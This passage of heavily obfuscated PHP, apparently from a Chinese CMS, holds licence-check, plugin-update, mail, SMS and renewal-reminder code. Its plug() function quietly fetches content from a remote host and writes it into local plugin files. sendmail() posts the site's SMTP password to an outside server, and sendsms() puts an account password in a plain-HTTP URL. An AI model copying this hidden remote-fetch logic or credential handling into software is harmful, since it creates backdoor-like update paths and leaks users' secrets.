    $I4ucVvPvP3 =& $GLOBALS[FlvdiKQ][03];
    goto I4ux6s;
    I4uldMhx6t:
    $I4ucVvPvP3 = $GLOBALS[FlvdiKQ][03];
    I4ux6s:
    $I4ueFvPvP2 = call_user_func_array("pack", array($GLOBALS[FlvdiKQ]{00}, &$I4ucVvPvP3));
    unset($I4ucV6);
    if (is_array($_SERVER)) goto I4ueWjgx6v;
    goto I4uldMhx6v;
    I4ueWjgx6v:
    $I4ucV6 =& $_SERVER[$I4ueFvPvP2];
    goto I4ux6u;
    I4uldMhx6v:
    $I4ucV6 = $_SERVER[$I4ueFvPvP2];
    I4ux6u:
    $I4ueF5 = call_user_func_array("www", array(&$I4ucV6));
    $I4uAD = $I4ueF1 != $I4ueF5;
    $I4uAE = (bool)$I4uAD;
    goto I4ux6w;
    I4uldMhx6x:I4ux6w:
    if ($I4uAE) goto I4ueWjgx71;
    goto I4uldMhx71;
    I4ueWjgx71:
    unset($I4utIAA);
    $domain = $C_fdomain;
    goto I4ux6r;
    I4uldMhx71:
    unset($I4ucVvP1);
    if (is_array($GLOBALS[FlvdiKQ])) goto I4ueWjgx73;
    goto I4uldMhx73;
    I4ueWjgx73:
    $I4ucVvP1 =& $GLOBALS[FlvdiKQ][03];
    goto I4ux72;
    I4uldMhx73:
    $I4ucVvP1 = $GLOBALS[FlvdiKQ][03];
    I4ux72:
    $I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[FlvdiKQ]{00}, &$I4ucVvP1));
    unset($I4utIAA);
    $domain = $_SERVER[$I4ueFvP0];
    I4ux6r:
    $I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[FlvdiKQ]{00}, $GLOBALS[FlvdiKQ]{4}));
    $I4uvPAA = $from . $I4ueFvP0;
    $I4uvPAB = $I4uvPAA . $domain;
    unset($I4ucVvP2);
    if (is_array($GLOBALS[FlvdiKQ])) goto I4ueWjgx75;
    goto I4uldMhx75;
    I4ueWjgx75:
    $I4ucVvP2 =& $GLOBALS[FlvdiKQ][05];
    goto I4ux74;
    I4uldMhx75:
    $I4ucVvP2 = $GLOBALS[FlvdiKQ][05];
    I4ux74:
    $I4ueFvP1 = call_user_func_array("pack", array($GLOBALS[FlvdiKQ]{00}, &$I4ucVvP2));
    $I4uvPAC = $I4ueFvP1 . $C_authcode;
    $I4ueF4 = call_user_func_array("getbody", array(&$I4uvPAB, &$I4uvPAC));
    unset($I4utIAD);
    $callback = $I4ueF4;
    $I4ueF0 = call_user_func_array("pack", array($GLOBALS[FlvdiKQ]{00}, $GLOBALS[FlvdiKQ]{0x6}));
    $I4uAA = $callback == $I4ueF0;
    if ($I4uAA) goto I4ueWjgx77;
    goto I4uldMhx77;
    I4ueWjgx77:
    $I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[FlvdiKQ]{00}, $GLOBALS[FlvdiKQ]{01}));
    $I4ueF1 = call_user_func_array("pack", array($GLOBALS[FlvdiKQ]{00}, $GLOBALS[FlvdiKQ]{01}));
    unset($I4utIAA);
    $I4utIAA = $I4ueF1;
    $_SESSION[$I4ueFvP0] = $I4utIAA;
    return true;
    goto I4ux76;
    I4uldMhx77:
    return false;
    I4ux76:I4ux6p:
}

function plug($plug, $path)
{
    global $conn, $C_authcode, $C_fdomain, $C_fzon, $from;
    unset($I4ucV1);
    if (is_array($GLOBALS[viTCblJ])) goto I4ueWjgx7m;
    goto I4uldMhx7m;
    I4ueWjgx7m:
    $I4ucV1 =& $GLOBALS[viTCblJ][0x0];
    goto I4ux7l;
    I4uldMhx7m:
    $I4ucV1 = $GLOBALS[viTCblJ][0x0];
    I4ux7l:
    unset($I4ucV2);
    if (is_array($GLOBALS[viTCblJ])) goto I4ueWjgx7k;
    goto I4uldMhx7k;
    I4ueWjgx7k:
    $I4ucV2 =& $GLOBALS[viTCblJ][0x1];
    goto I4ux7j;
    I4uldMhx7k:
    $I4ucV2 = $GLOBALS[viTCblJ][0x1];
    I4ux7j:
    $I4ueF0 = call_user_func_array("pack", array(&$I4ucV1, &$I4ucV2));
    $I4uAA = $C_fdomain != $I4ueF0;
    $I4uAC = (bool)$I4uAA;
    if ($I4uAC) goto I4ueWjgx7i;
    goto I4uldMhx7i;
    I4ueWjgx7i:
    $I4uAB = $C_fzon == 1;
    $I4uAC = (bool)$I4uAB;
    goto I4ux7h;
    I4uldMhx7i:I4ux7h:
    $I4uAE = (bool)$I4uAC;
    if ($I4uAE) goto I4ueWjgx7g;
    goto I4uldMhx7g;
    I4ueWjgx7g:
    $I4ueF3 = call_user_func_array("www", array(&$C_fdomain));
    unset($I4ucVvPvP5);
    if (is_array($GLOBALS[viTCblJ])) goto I4ueWjgx7c;
    goto I4uldMhx7c;
    I4ueWjgx7c:
    $I4ucVvPvP5 =& $GLOBALS[viTCblJ][0x0];
    goto I4ux7b;
    I4uldMhx7c:
    $I4ucVvPvP5 = $GLOBALS[viTCblJ][0x0];
    I4ux7b:
    unset($I4ucVvPvP6);
    if (is_array($GLOBALS[viTCblJ])) goto I4ueWjgx7a;
    goto I4uldMhx7a;
    I4ueWjgx7a:
    $I4ucVvPvP6 =& $GLOBALS[viTCblJ][02];
    goto I4ux79;
    I4uldMhx7a:
    $I4ucVvPvP6 = $GLOBALS[viTCblJ][02];
    I4ux79:
    $I4ueFvPvP4 = call_user_func_array("pack", array(&$I4ucVvPvP5, &$I4ucVvPvP6));
    unset($I4ucV10);
    if (is_array($_SERVER)) goto I4ueWjgx7e;
    goto I4uldMhx7e;
    I4ueWjgx7e:
    $I4ucV10 =& $_SERVER[$I4ueFvPvP4];
    goto I4ux7d;
    I4uldMhx7e:
    $I4ucV10 = $_SERVER[$I4ueFvPvP4];
    I4ux7d:
    $I4ueF9 = call_user_func_array("www", array(&$I4ucV10));
    $I4uAD = $I4ueF3 != $I4ueF9;
    $I4uAE = (bool)$I4uAD;
    goto I4ux7f;
    I4uldMhx7g:I4ux7f:
    if ($I4uAE) goto I4ueWjgx7n;
    goto I4uldMhx7n;
    I4ueWjgx7n:
    unset($I4utIAA);
    $domain = $C_fdomain;
    goto I4ux78;
    I4uldMhx7n:
    unset($I4ucVvP1);
    if (is_array($GLOBALS[viTCblJ])) goto I4ueWjgx7r;
    goto I4uldMhx7r;
    I4ueWjgx7r:
    $I4ucVvP1 =& $GLOBALS[viTCblJ][0x0];
    goto I4ux7q;
    I4uldMhx7r:
    $I4ucVvP1 = $GLOBALS[viTCblJ][0x0];
    I4ux7q:
    unset($I4ucVvP2);
    if (is_array($GLOBALS[viTCblJ])) goto I4ueWjgx7p;
    goto I4uldMhx7p;
    I4ueWjgx7p:
    $I4ucVvP2 =& $GLOBALS[viTCblJ][02];
    goto I4ux7o;
    I4uldMhx7p:
    $I4ucVvP2 = $GLOBALS[viTCblJ][02];
    I4ux7o:
    $I4ueFvP0 = call_user_func_array("pack", array(&$I4ucVvP1, &$I4ucVvP2));
    unset($I4utIAA);
    $domain = $_SERVER[$I4ueFvP0];
    I4ux78:
    $I4uvPAA = $path . $plug;
    unset($I4ucVvP1);
    if (is_array($GLOBALS[viTCblJ])) goto I4ueWjgx7w;
    goto I4uldMhx7w;
    I4ueWjgx7w:
    $I4ucVvP1 =& $GLOBALS[viTCblJ][0x0];
    goto I4ux7v;
    I4uldMhx7w:
    $I4ucVvP1 = $GLOBALS[viTCblJ][0x0];
    I4ux7v:
    unset($I4ucVvP2);
    if (is_array($GLOBALS[viTCblJ])) goto I4ueWjgx7u;
    goto I4uldMhx7u;
    I4ueWjgx7u:
    $I4ucVvP2 =& $GLOBALS[viTCblJ][0x3];
    goto I4ux7t;
    I4uldMhx7u:
    $I4ucVvP2 = $GLOBALS[viTCblJ][0x3];
    I4ux7t:
    $I4ueFvP0 = call_user_func_array("pack", array(&$I4ucVvP1, &$I4ucVvP2));
    $I4uvPAB = $I4uvPAA . $I4ueFvP0;
    $I4ueF5 = call_user_func_array("is_file", array(&$I4uvPAB));
    if ($I4ueF5) goto I4ueWjgx7x;
    goto I4uldMhx7x;
    I4ueWjgx7x:
    $I4uvPvPAA = $path . $plug;
    unset($I4ucVvPvP1);
    if (is_array($GLOBALS[viTCblJ])) goto I4ueWjgx83;
    goto I4uldMhx83;
    I4ueWjgx83:
    $I4ucVvPvP1 =& $GLOBALS[viTCblJ][0x0];
    goto I4ux82;
    I4uldMhx83:
    $I4ucVvPvP1 = $GLOBALS[viTCblJ][0x0];
    I4ux82:
    unset($I4ucVvPvP2);
    if (is_array($GLOBALS[viTCblJ])) goto I4ueWjgx81;
    goto I4uldMhx81;
    I4ueWjgx81:
    $I4ucVvPvP2 =& $GLOBALS[viTCblJ][0x3];
    goto I4ux8z;
    I4uldMhx81:
    $I4ucVvPvP2 = $GLOBALS[viTCblJ][0x3];
    I4ux8z:
    $I4ueFvPvP0 = call_user_func_array("pack", array(&$I4ucVvPvP1, &$I4ucVvPvP2));
    $I4uvPvPAB = $I4uvPvPAA . $I4ueFvPvP0;
    $I4ueFvP5 = call_user_func_array("file_get_contents", array(&$I4uvPvPAB));
    $I4ueF6 = call_user_func_array("substr", array(&$I4ueFvP5, 0, 40));
    unset($I4ucV8);
    if (is_array($GLOBALS[viTCblJ])) goto I4ueWjgx87;
    goto I4uldMhx87;
    I4ueWjgx87:
    $I4ucV8 =& $GLOBALS[viTCblJ][0x0];
    goto I4ux86;
    I4uldMhx87:
    $I4ucV8 = $GLOBALS[viTCblJ][0x0];
    I4ux86:
    unset($I4ucV9);
    if (is_array($GLOBALS[viTCblJ])) goto I4ueWjgx85;
    goto I4uldMhx85;
    I4ueWjgx85:
    $I4ucV9 =& $GLOBALS[viTCblJ][0x4];
    goto I4ux84;
    I4uldMhx85:
    $I4ucV9 = $GLOBALS[viTCblJ][0x4];
    I4ux84:
    $I4ueF7 = call_user_func_array("pack", array(&$I4ucV8, &$I4ucV9));
    $I4ueF10 = call_user_func_array("md5", array(&$C_authcode));
    $I4uAC = $I4ueF7 . $I4ueF10;
    $I4uAD = $I4ueF6 != $I4uAC;
    if ($I4uAD) goto I4ueWjgx88;
    goto I4uldMhx88;
    I4ueWjgx88:
    $I4uvPAA = $path . $plug;
    unset($I4ucVvP1);
    if (is_array($GLOBALS[viTCblJ])) goto I4ueWjgx8c;
    goto I4uldMhx8c;
    I4ueWjgx8c:
    $I4ucVvP1 =& $GLOBALS[viTCblJ][0x0];
    goto I4ux8b;
    I4uldMhx8c:
    $I4ucVvP1 = $GLOBALS[viTCblJ][0x0];
    I4ux8b:
    unset($I4ucVvP2);
    if (is_array($GLOBALS[viTCblJ])) goto I4ueWjgx8a;
    goto I4uldMhx8a;
    I4ueWjgx8a:
    $I4ucVvP2 =& $GLOBALS[viTCblJ][0x3];
    goto I4ux89;
    I4uldMhx8a:
    $I4ucVvP2 = $GLOBALS[viTCblJ][0x3];
    I4ux89:
    $I4ueFvP0 = call_user_func_array("pack", array(&$I4ucVvP1, &$I4ucVvP2));
    $I4uvPAB = $I4uvPAA . $I4ueFvP0;
    unset($I4ucVvPvP6);
    if (is_array($GLOBALS[viTCblJ])) goto I4ueWjgx8e;
    goto I4uldMhx8e;
    I4ueWjgx8e:
    $I4ucVvPvP6 =& $GLOBALS[viTCblJ][0x0];
    goto I4ux8d;
    I4uldMhx8e:
    $I4ucVvPvP6 = $GLOBALS[viTCblJ][0x0];
    I4ux8d:
    $I4ueFvPvP5 = call_user_func_array("pack", array(&$I4ucVvPvP6, $GLOBALS[viTCblJ]{05}));
    $I4uvPvPAC = $from . $I4ueFvPvP5;
    $I4uvPvPAD = $I4uvPvPAC . $domain;
    unset($I4ucVvPvP9);
    if (is_array($GLOBALS[viTCblJ])) goto I4ueWjgx8i;
    goto I4uldMhx8i;
    I4ueWjgx8i:
    $I4ucVvPvP9 =& $GLOBALS[viTCblJ][0x0];
    goto I4ux8h;
    I4uldMhx8i:
    $I4ucVvPvP9 = $GLOBALS[viTCblJ][0x0];
    I4ux8h:
    $I4ueFvPvP8 = call_user_func_array("pack", array(&$I4ucVvPvP9, $GLOBALS[viTCblJ]{0x6}));
    $I4uvPvPAE = $I4ueFvPvP8 . $C_authcode;
    unset($I4ucVvPvP11);
    if (is_array($GLOBALS[viTCblJ])) goto I4ueWjgx8g;
    goto I4uldMhx8g;
    I4ueWjgx8g:
    $I4ucVvPvP11 =& $GLOBALS[viTCblJ][0x0];
    goto I4ux8f;
    I4uldMhx8g:
    $I4ucVvPvP11 = $GLOBALS[viTCblJ][0x0];
    I4ux8f:
    $I4ueFvPvP10 = call_user_func_array("pack", array(&$I4ucVvPvP11, $GLOBALS[viTCblJ]{0x7}));
    $I4uvPvPAF = $I4uvPvPAE . $I4ueFvPvP10;
    $I4uvPvPAG = $I4uvPvPAF . $plug;
    $I4ueFvP14 = call_user_func_array("getbody", array(&$I4uvPvPAD, &$I4uvPvPAG));
    $I4ueF15 = call_user_func_array("file_put_contents", array(&$I4uvPAB, &$I4ueFvP14));
    goto I4ux7y;
    I4uldMhx88:I4ux7y:
    goto I4ux7s;
    I4uldMhx7x:
    $I4uvPAA = $path . $plug;
    unset($I4ucVvP1);
    if (is_array($GLOBALS[viTCblJ])) goto I4ueWjgx8m;
    goto I4uldMhx8m;
    I4ueWjgx8m:
    $I4ucVvP1 =& $GLOBALS[viTCblJ][0x0];
    goto I4ux8l;
    I4uldMhx8m:
    $I4ucVvP1 = $GLOBALS[viTCblJ][0x0];
    I4ux8l:
    unset($I4ucVvP2);
    if (is_array($GLOBALS[viTCblJ])) goto I4ueWjgx8k;
    goto I4uldMhx8k;
    I4ueWjgx8k:
    $I4ucVvP2 =& $GLOBALS[viTCblJ][0x3];
    goto I4ux8j;
    I4uldMhx8k:
    $I4ucVvP2 = $GLOBALS[viTCblJ][0x3];
    I4ux8j:
    $I4ueFvP0 = call_user_func_array("pack", array(&$I4ucVvP1, &$I4ucVvP2));
    $I4uvPAB = $I4uvPAA . $I4ueFvP0;
    unset($I4ucVvPvP6);
    if (is_array($GLOBALS[viTCblJ])) goto I4ueWjgx8o;
    goto I4uldMhx8o;
    I4ueWjgx8o:
    $I4ucVvPvP6 =& $GLOBALS[viTCblJ][0x0];
    goto I4ux8n;
    I4uldMhx8o:
    $I4ucVvPvP6 = $GLOBALS[viTCblJ][0x0];
    I4ux8n:
    $I4ueFvPvP5 = call_user_func_array("pack", array(&$I4ucVvPvP6, $GLOBALS[viTCblJ]{05}));
    $I4uvPvPAC = $from . $I4ueFvPvP5;
    $I4uvPvPAD = $I4uvPvPAC . $domain;
    unset($I4ucVvPvP9);
    if (is_array($GLOBALS[viTCblJ])) goto I4ueWjgx8s;
    goto I4uldMhx8s;
    I4ueWjgx8s:
    $I4ucVvPvP9 =& $GLOBALS[viTCblJ][0x0];
    goto I4ux8r;
    I4uldMhx8s:
    $I4ucVvPvP9 = $GLOBALS[viTCblJ][0x0];
    I4ux8r:
    $I4ueFvPvP8 = call_user_func_array("pack", array(&$I4ucVvPvP9, $GLOBALS[viTCblJ]{0x6}));
    $I4uvPvPAE = $I4ueFvPvP8 . $C_authcode;
    unset($I4ucVvPvP11);
    if (is_array($GLOBALS[viTCblJ])) goto I4ueWjgx8q;
    goto I4uldMhx8q;
    I4ueWjgx8q:
    $I4ucVvPvP11 =& $GLOBALS[viTCblJ][0x0];
    goto I4ux8p;
    I4uldMhx8q:
    $I4ucVvPvP11 = $GLOBALS[viTCblJ][0x0];
    I4ux8p:
    $I4ueFvPvP10 = call_user_func_array("pack", array(&$I4ucVvPvP11, $GLOBALS[viTCblJ]{0x7}));
    $I4uvPvPAF = $I4uvPvPAE . $I4ueFvPvP10;
    $I4uvPvPAG = $I4uvPvPAF . $plug;
    $I4ueFvP14 = call_user_func_array("getbody", array(&$I4uvPvPAD, &$I4uvPvPAG));
    $I4ueF15 = call_user_func_array("file_put_contents", array(&$I4uvPAB, &$I4ueFvP14));
    I4ux7s:
}

function ycode($string)
{
    unset($I4ucVvP1);
    if (is_array($GLOBALS[unmbfCv])) goto I4ueWjgx8w;
    goto I4uldMhx8w;
    I4ueWjgx8w:
    $I4ucVvP1 =& $GLOBALS[unmbfCv][0];
    goto I4ux8v;
    I4uldMhx8w:
    $I4ucVvP1 = $GLOBALS[unmbfCv][0];
    I4ux8v:
    unset($I4ucVvP2);
    if (is_array($GLOBALS[unmbfCv])) goto I4ueWjgx8u;
    goto I4uldMhx8u;
    I4ueWjgx8u:
    $I4ucVvP2 =& $GLOBALS[unmbfCv][1];
    goto I4ux8t;
    I4uldMhx8u:
    $I4ucVvP2 = $GLOBALS[unmbfCv][1];
    I4ux8t:
    $I4ueFvP0 = call_user_func_array("pack", array(&$I4ucVvP1, &$I4ucVvP2));
    unset($I4ucVvP6);
    if (is_array($GLOBALS[unmbfCv])) goto I4ueWjgx91;
    goto I4uldMhx91;
    I4ueWjgx91:
    $I4ucVvP6 =& $GLOBALS[unmbfCv][0];
    goto I4ux9z;
    I4uldMhx91:
    $I4ucVvP6 = $GLOBALS[unmbfCv][0];
    I4ux9z:
    unset($I4ucVvP7);
    if (is_array($GLOBALS[unmbfCv])) goto I4ueWjgx8y;
    goto I4uldMhx8y;
    I4ueWjgx8y:
    $I4ucVvP7 =& $GLOBALS[unmbfCv][02];
    goto I4ux8x;
    I4uldMhx8y:
    $I4ucVvP7 = $GLOBALS[unmbfCv][02];
    I4ux8x:
    $I4ueFvP5 = call_user_func_array("pack", array(&$I4ucVvP6, &$I4ucVvP7));
    $I4ueF10 = call_user_func_array("xcode", array(&$string, &$I4ueFvP0, &$I4ueFvP5, 0));
    return $I4ueF10;
}

function zcode($string)
{
    $I4ueFvP0 = call_user_func_array("pack", array($GLOBALS[HaxgcGJ]{00}, $GLOBALS[HaxgcGJ]{1}));
    $I4ueFvP1 = call_user_func_array("pack", array($GLOBALS[HaxgcGJ]{00}, $GLOBALS[HaxgcGJ]{02}));
    $I4ueF2 = call_user_func_array("xcode", array(&$string, &$I4ueFvP0, &$I4ueFvP1, 0));
    return $I4ueF2;
}


function sendmail($subject, $body, $mailto)
{
    global $C_email, $C_domain, $C_fdomain, $C_logo, $C_title, $C_mailcode, $C_mailtype, $C_smtp, $mail;
    if (time() - intval($_SESSION["time2"]) > 30) {
        if ($C_mailtype == 1) {
            GetBody($mail . "/fahuo.php", "mail_from=" . urlencode($C_email) . "&mail_to=" . urlencode($mailto) . "&mail_name=" . urlencode($C_title) . "&mail_title=" . urlencode($subject) . "&mail_content=" . urlencode($body) . "&mail_smtp=" . urlencode($C_smtp) . "&mail_pwd=" . urlencode($C_mailcode) . "&mail_logo=" . urlencode($C_fdomain . "/media/" . $C_logo) . "&mail_web=" . urlencode($C_domain));
        } else {
            GetBody($mail . "/fahuo.php", "mail_from=" . urlencode("scms") . "&mail_to=" . urlencode($mailto) . "&mail_name=" . urlencode($C_title) . "&mail_title=" . urlencode($subject) . "&mail_content=" . urlencode($body) . "&mail_smtp=" . urlencode($C_smtp) . "&mail_pwd=" . urlencode($C_mailcode) . "&mail_logo=" . urlencode($C_fdomain . "/media/" . $C_logo) . "&mail_web=" . urlencode($C_domain));
        }
        $_SESSION["time2"] = time();
        return "success";
    } else {
        return 30 - time() + intval($_SESSION["time2"]);
    }
}

function sendsms($content, $recieve)
{
    global $C_userid, $C_codeid, $C_codekey;
    if (intval($C_userid) > 0) {
        if (time() - intval($_SESSION["time"]) > 60) {
            getbody("http://dx.10691.net:8888/sms.aspx?action=send&userid=" . $C_userid . "&account=" . $C_codeid . "&password=" . $C_codekey . "&content=" . urlencode($content) . "&sendTime=&mobile=" . $recieve . "&extno=", "");
            $_SESSION["time"] = time();
            return "success";
        } else {
            return 60 - time() + intval($_SESSION["time"]);
        }
    }
}


if ($config->tx == "true") {
    //每月提醒
    $sql = "select * from sl_orders,sl_member where O_mid=M_id and O_state=1 and (TIMESTAMPDIFF(DAY,DATE_FORMAT(NOW(), '%Y-%m-%d %H:%i:%S'),O_time2)=2 or TIMESTAMPDIFF(DAY,DATE_FORMAT(NOW(), '%Y-%m-%d %H:%i:%S'),O_time2)=1) and TIMESTAMPDIFF(DAY,O_today,DATE_FORMAT(NOW(), '%Y-%m-%d %H:%i:%S'))>0";
    $result = mysqli_query($conn, $sql);
    if (mysqli_num_rows($result) > 0) {
        while ($row = mysqli_fetch_assoc($result)) {
            if ($row["O_mid"] == 1) {
                $email = splitx($row["O_address"], "__", 0);
            } else {
                $email = $row["M_email"];
                sendsms("【" . $C_smssign . "】您有订单将要到期，请尽快待续费！", $row["M_mobile"]);
            }
            sendmail("您有订单将要到期", "<p>您有订单将要到期，请尽快待续费</p><p>订单名称：" . $row["O_title"] . "</p><p>请登录<a href=\"" . gethttp() . $_SERVER["HTTP_HOST"] . "/member\">会员中心</a>执行续费操作</p>", $email);
            mysqli_query($conn, "update sl_orders set O_today='" . date('Y-m-d H:i:s') . "' where O_id=" . $row["O_id"]);
        }
    }
}
?>